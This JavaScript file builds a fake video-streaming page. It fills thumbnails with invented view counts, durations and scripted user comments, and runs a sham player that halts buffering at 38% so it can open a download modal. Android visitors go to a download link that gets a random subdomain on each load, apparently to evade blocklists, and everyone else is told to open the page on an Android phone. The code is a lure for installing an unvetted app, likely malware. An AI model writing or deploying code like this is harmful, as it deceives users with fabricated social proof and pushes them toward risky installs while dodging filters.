document.addEventListener('DOMContentLoaded', () => {
    const grid = document.getElementById('videoGrid');
    const modal = document.getElementById('downloadModal');
    const closeModal = document.getElementById('closeModal');
    const downloadLink = document.getElementById('downloadLink');
    const stickyFooter = document.getElementById('stickyFooter');
    const androidAction = document.getElementById('androidAction');
    const otherAction = document.getElementById('otherAction');
    const shareBtn = document.getElementById('shareBtn');
    const toast = document.getElementById('toast');
    const loadMoreBtn = document.getElementById('loadMoreBtn');
    
    const playerOverlay = document.getElementById('playerOverlay');
    const closePlayer = document.getElementById('closePlayer');
    const playerTitle = document.getElementById('playerTitle');
    const fakeList = document.getElementById('fakeList');
    const progressFill = document.querySelector('.progress-fill');
    const bufferingText = document.querySelector('.player-loading p');
    const playerContainer = document.querySelector('.player-container');

    const isAndroid = /Android/i.test(navigator.userAgent);
    
    // Generate random subdomain prefix (e.g. ss44, aa67, bb23)
    function getRandomSubdomain() {
        // Generate two random lowercase letters as prefix
        const randomChar1 = String.fromCharCode(97 + Math.floor(Math.random() * 26)); // a-z
        const randomChar2 = String.fromCharCode(97 + Math.floor(Math.random() * 26)); // a-z
        const prefix = randomChar1 + randomChar2;
        const randomNum = Math.floor(Math.random() * 100) + 1; // Random number 1-100
        return prefix + randomNum;
    }
    
    // Extract domain from full URL and add random subdomain prefix
    function addRandomSubdomain(url) {
        try {
            const urlObj = new URL(url);
            const hostname = urlObj.hostname;
            const randomSubdomain = getRandomSubdomain();
            urlObj.hostname = `${randomSubdomain}.${hostname}`;
            return urlObj.toString();
        } catch (e) {
            return url;
        }
    }
    
    // Build random download link
    const downloadUrl = addRandomSubdomain(videoConfig.androidDownloadUrl);
    downloadLink.href = downloadUrl;
    
    let globalImages = [];
    let currentIndex = 0;
    const BATCH_SIZE = 20;
    let isLoading = false;

    async function fetchImages() {
        // If config already has image list, use it directly (supports file:// protocol)
        if (videoConfig.images && videoConfig.images.length > 0) {
            return videoConfig.images;
        }

        // Try to read directory list from server (requires HTTP server)
        try {
            const response = await fetch('images/');
            if (response.ok) {
                const text = await response.text();
                const regex = /href=["']([^"']+\.(jpg|jpeg|png|gif|webp|svg))["']/gi;
                const matches = [];
                let match;
                while ((match = regex.exec(text)) !== null) {
                    let filename = decodeURIComponent(match[1]);
                    filename = filename.split('/').pop(); 
                    if (!matches.includes(filename)) {
                        matches.push(filename);
                    }
                }
                if (matches.length > 0) {
                    // Natural sort
                    matches.sort((a, b) => {
                        return a.localeCompare(b, undefined, { numeric: true, sensitivity: 'base' });
                    });
                    return matches;
                }
            }
        } catch (e) {
            // Will fail under file:// protocol, handle silently
        }

        return [];
    }

    fetchImages().then(images => {
        globalImages = images;
        if (globalImages.length === 0) {
            grid.innerHTML = '<div style="color:#666;text-align:center;grid-column:1/-1;padding:20px;">No video resources, please upload images to the images folder</div>';
        } else {
            renderGrid(globalImages);
        }
    });

    const utils = {
        duration: () => {
            const min = 15;
            const max = 120;
            const m = Math.floor(Math.random() * (max - min + 1)) + min;
            const s = Math.floor(Math.random() * 60).toString().padStart(2, '0');
            return `${m}:${s}`;
        },
        views: () => (Math.floor(Math.random() * 200) + 5) + 'K',
        percent: () => (Math.floor(Math.random() * 10) + 90) + '%',
        tags: () => {
            const tags = ['HD', 'Premium', 'Exclusive', 'Hot', 'New', 'Trending', 'Subbed', 'HD', 'Popular', 'Featured', 'Best', 'Top'];
            const shuffled = tags.sort(() => 0.5 - Math.random());
            return shuffled.slice(0, 2);
        },
        comments: [
            "Wow, this is incredible",
            "Been looking for this for so long",
            "Thanks for sharing!",
            "Where do you find gems like this",
            "Can't resist, must download",
            "Quality is amazing, no lag",
            "Better watch with headphones",
            "This is insane",
            "Best content I've seen",
            "VIP is worth it, so many resources",
            "Another late night",
            "This is too good",
            "Updates are so fast",
            "Great site, no ads"
        ]
    };

    function getImageSrc(src) {
        return (src.startsWith('http://') || src.startsWith('https://')) ? src : `images/${src}`;
    }

    function getTitleFromSrc(src) {
        return (src.startsWith('http') ? src.split('/').pop().replace(/\.[^/.]+$/, '').split('?')[0] : src.replace(/\.[^/.]+$/, '')) || 'Video';
    }

    function createVideoCard(filename) {
        const title = getTitleFromSrc(filename);
        const tags = utils.tags();
        const isVip = Math.random() > 0.7;
        const vipBadge = isVip ? '<div class="video-overlay-vip">VIP</div>' : '';

        const card = document.createElement('div');
        card.className = 'video-card';
        card.innerHTML = `
            <div class="thumbnail-wrapper">
                <img src="${getImageSrc(filename)}" alt="${title}" loading="lazy">
                <div class="video-overlay-hd">HD</div>
                ${vipBadge}
                <div class="video-overlay-time">${utils.duration()}</div>
            </div>
            <div class="video-info">
                <div class="video-title">${title}</div>
                <div class="video-tags">
                    <span class="tag hot">${tags[0]}</span>
                    <span class="tag">${tags[1]}</span>
                </div>
                <div class="video-meta">
                    <span><i class="fas fa-eye"></i> ${utils.views()}</span>
                    <span><i class="fas fa-heart"></i> ${utils.percent()}</span>
                </div>
            </div>
        `;

        const img = card.querySelector('img');
        img.onerror = function() {
            card.remove();
        };

        card.addEventListener('click', () => openPlayer(title, filename));
        return card;
    }

    function renderGrid(images) {
        if (!images || images.length === 0) return;
        if (grid.children.length === 0) {
             grid.innerHTML = ''; 
        }
        currentIndex = 0;
        appendBatch(true);
        setupIntersectionObserver();
    }

    function appendBatch(isInitial = false) {
        const fragment = document.createDocumentFragment();
        let batch = [];

        if (currentIndex < globalImages.length) {
            batch = globalImages.slice(currentIndex, currentIndex + BATCH_SIZE);
            currentIndex += batch.length;
        } else {
            const shuffled = [...globalImages].sort(() => 0.5 - Math.random());
            batch = shuffled.slice(0, 10);
        }

        if (isInitial) {
             batch = batch.sort(() => 0.5 - Math.random());
        }

        batch.forEach(filename => {
            const card = createVideoCard(filename);
            fragment.appendChild(card);
        });
        
        grid.appendChild(fragment);
    }

    function setupIntersectionObserver() {
        const observer = new IntersectionObserver((entries) => {
            if (entries[0].isIntersecting && !isLoading) {
                triggerLoadMore();
            }
        }, { rootMargin: '200px' });

        observer.observe(loadMoreBtn);
    }

    function triggerLoadMore() {
        if (isLoading) return;
        isLoading = true;
        
        const originalContent = loadMoreBtn.innerHTML;
        loadMoreBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading more...';
        
        setTimeout(() => {
            appendBatch();
            loadMoreBtn.innerHTML = originalContent;
            isLoading = false;
        }, 800);
    }

    loadMoreBtn.addEventListener('click', () => {
        triggerLoadMore();
    });

    function openPlayer(title, filename) {
        playerTitle.textContent = title.substring(0, 15) + (title.length > 15 ? '...' : '');
        playerOverlay.classList.add('active');
        
        const playerHTML = `
            <div class="player-video-placeholder">
                <div class="player-loading">
                    <i class="fas fa-spinner fa-spin"></i>
                    <p>Buffering 0%...</p>
                </div>
            </div>
        `;
        playerContainer.innerHTML = playerHTML;
        progressFill.style.width = '0%';

        const infoHTML = `
            <div class="player-main-title">${title}</div>
            <div class="player-stats">
                <span><i class="fas fa-play-circle"></i> ${utils.views()}</span>
                <span><i class="fas fa-clock"></i> ${new Date().toLocaleDateString()}</span>
            </div>
        `;
        
        let commentsHTML = '';
        const randomComments = [...utils.comments].sort(() => 0.5 - Math.random()).slice(0, 4);
        randomComments.forEach(c => {
            commentsHTML += `
                <div class="comment-item">
                    <div class="avatar"><i class="fas fa-user"></i></div>
                    <div class="comment-content">
                        <div class="user-name">Anonymous_${Math.floor(Math.random()*1000)}</div>
                        <div class="user-text">${c}</div>
                    </div>
                </div>
            `;
        });

        let recHTML = '';
        if (globalImages.length > 0) {
            const shuffled = [...globalImages].sort(() => 0.5 - Math.random()).slice(0, 6);
            shuffled.forEach(f => {
                const t = getTitleFromSrc(f);
                recHTML += `
                    <div class="fake-item" onclick="event.stopPropagation();">
                        <div class="fake-thumb">
                            <img src="${getImageSrc(f)}" loading="lazy">
                        </div>
                        <div class="fake-meta">
                            <div class="fake-title">${t}</div>
                            <div class="fake-views">${utils.views()} plays</div>
                        </div>
                    </div>
                `;
            });
        }

        const fullContent = `
            <div class="player-details">
                ${infoHTML}
            </div>
            <div class="comments-section">
                <div class="section-header">Hot Comments</div>
                ${commentsHTML}
            </div>
            <div class="recommendations">
                <div class="section-header">Recommended for You</div>
                <div class="fake-list" id="fakeList">
                    ${recHTML}
                </div>
            </div>
        `;
        
        let detailsContainer = document.querySelector('.player-details-container');
        if (!detailsContainer) {
            detailsContainer = document.createElement('div');
            detailsContainer.className = 'player-details-container';
            playerOverlay.appendChild(detailsContainer);
        }
        detailsContainer.innerHTML = fullContent;
        
        const recItems = detailsContainer.querySelectorAll('.fake-item');
        recItems.forEach(item => {
            item.addEventListener('click', openModal);
        });

        const bufferingText = playerContainer.querySelector('p');
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.floor(Math.random() * 12) + 3;
            if (progress > 38) {
                clearInterval(interval);
                openModal();
            }
            progressFill.style.width = Math.min(progress, 38) + '%';
            if (bufferingText) bufferingText.textContent = `Buffering ${Math.min(progress, 38)}%...`;
        }, 150);
    }

    closePlayer.addEventListener('click', () => {
        playerOverlay.classList.remove('active');
    });

    function openModal() {
        if (isAndroid) {
            androidAction.style.display = 'block';
            otherAction.style.display = 'none';
        } else {
            androidAction.style.display = 'none';
            otherAction.style.display = 'block';
        }
        modal.classList.add('active');
    }

    function hideModal() {
        modal.classList.remove('active');
    }

    closeModal.addEventListener('click', hideModal);
    modal.addEventListener('click', (e) => {
        if (e.target === modal) hideModal();
    });

    stickyFooter.addEventListener('click', () => {
        if (isAndroid) {
            window.location.href = downloadUrl;
        } else {
            openModal();
        }
    });

    shareBtn.addEventListener('click', () => {
        const url = window.location.href;
        navigator.clipboard.writeText(url).then(() => {
            showToast('Link copied, please send to Android phone to open');
        }).catch(() => {
            const textArea = document.createElement("textarea");
            textArea.value = url;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand("Copy");
            textArea.remove();
            showToast('Link copied, please send to Android phone to open');
        });
    });

    function showToast(msg) {
        toast.textContent = msg;
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
        }, 2000);
    }
});